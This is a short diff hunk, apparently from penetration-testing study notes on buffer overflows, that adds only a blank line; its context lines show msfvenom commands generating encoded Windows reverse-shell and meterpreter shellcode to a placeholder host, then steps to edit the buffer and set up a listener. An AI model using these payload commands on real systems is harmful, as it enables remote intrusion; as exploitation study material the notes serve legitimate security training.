@@ -67,6 +67,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e shikata_ga_na
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
 ```
 edit finalBuff
+
 setup a listener
 
 ```
